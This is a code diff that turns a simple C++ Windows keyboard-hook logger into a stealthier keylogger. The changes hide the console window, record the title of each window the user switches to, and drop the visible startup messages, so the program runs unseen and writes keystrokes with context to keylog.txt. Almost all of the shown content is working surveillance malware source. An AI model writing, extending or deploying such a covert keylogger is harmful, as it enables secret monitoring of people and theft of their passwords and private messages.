@@ -1,25 +1,50 @@
+#define _WIN32_WINNT 0x0500 // Required for console hiding
 #include <iostream>
 #include <windows.h>
 #include <fstream>
+#include <string>
 
-// This variable will hold our "Hook"
+// Global variables
 HHOOK hHook;
+HWND lastWindow = NULL; // To keep track of the last window we logged
 
-// This function runs every time a key is pressed
-LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+// Helper function to hide the console window (Stealth Mode)
+void StealthMode() {
+    HWND stealth;
+    AllocConsole();
+    stealth = FindWindowA("ConsoleWindowClass", NULL);
+    ShowWindow(stealth, 0);
+}
+
+// Helper function to log the active window title
+void LogActiveWindow(std::ofstream &file) {
+    HWND currWindow = GetForegroundWindow();
     
-    // nCode >= 0 means there is a keystroke to process
-    // wParam == WM_KEYDOWN means the key was just pressed down
-    if (nCode >= 0 && wParam == WM_KEYDOWN) {
+    // Only log if the user switched to a DIFFERENT window
+    if (currWindow != lastWindow) {
+        char windowTitle[256];
+        GetWindowTextA(currWindow, windowTitle, sizeof(windowTitle));
         
-        // kbdStruct contains the details of the key
+        // Write the new window title with some formatting
+        // We use a timestamp-like format for readability
+        file << "\n\n[WINDOW: " << windowTitle << "] \n";
+        
+        lastWindow = currWindow;
+    }
+}
+
+LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    if (nCode >= 0 && wParam == WM_KEYDOWN) {
         KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT *)lParam;
         
-        // 1. Open the file in "Append" mode
+        // Open file in Append mode
         std::ofstream logfile;
         logfile.open("keylog.txt", std::ios::app);
 
-        // 2. Filter specific keys (Optional: make output readable)
+        // 1. Check & Log Window Title first
+        LogActiveWindow(logfile);
+
+        // 2. Map Virtual Key codes to readable text
         if (kbdStruct->vkCode == VK_RETURN) {
             logfile << "\n";
         }
@@ -29,43 +54,51 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
         else if (kbdStruct->vkCode == VK_BACK) {
             logfile << "[BACKSPACE]";
         }
-        // 3. Log normal characters
+        else if (kbdStruct->vkCode == VK_TAB) {
+            logfile << "[TAB]";
+        }
+        else if (kbdStruct->vkCode == VK_SHIFT || kbdStruct->vkCode == VK_LSHIFT || kbdStruct->vkCode == VK_RSHIFT) {
+            // Do nothing for shift (avoids logging [SHIFT] constantly)
+        }
         else {
-            logfile << (char)kbdStruct->vkCode;
+            // Retrieve the character
+            char key = (char)kbdStruct->vkCode;
+            
+            // Basic case handling (optional: use ToAscii for better handling)
+            // If Shift is held, we would usually capitalize, but for this simple version:
+            if (key >= 65 && key <= 90) { // A-Z
+                // If CapsLock is off, convert to lowercase (simple logic)
+                if (!(GetKeyState(VK_CAPITAL) & 0x0001)) {
+                    key += 32; 
+                }
+            }
+            logfile << key;
         }
 
         logfile.close();
     }
-
-    // IMPORTANT: Pass the key to the next program so we don't "freeze" the keyboard
     return CallNextHookEx(hHook, nCode, wParam, lParam);
 }
 
 int main() {
-    // 1. Hide the Console Window (Stealth Mode)
-    // Uncomment the next line to make the program invisible!
-    // ShowWindow(GetConsoleWindow(), SW_HIDE);
-
-    std::cout << "Keylogger started... (Check keylog.txt)" << std::endl;
+    // 1. Activate Stealth Mode (Hides the black window)
+    // WARNING: To stop this, you must use Task Manager!
+    StealthMode(); 
 
     // 2. Set the Hook
-    // WH_KEYBOARD_LL = Low Level Keyboard Hook
     hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
 
     if (hHook == NULL) {
-        std::cout << "Failed to install hook!" << std::endl;
         return 1;
     }
 
-    // 3. Message Loop
-    // Windows programs need a loop to stay alive and listen for messages
+    // 3. Keep Alive
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)) {
         TranslateMessage(&msg);
         DispatchMessage(&msg);
     }
 
-    // 4. Cleanup (Unhook)
     UnhookWindowsHookEx(hHook);
     return 0;
 }
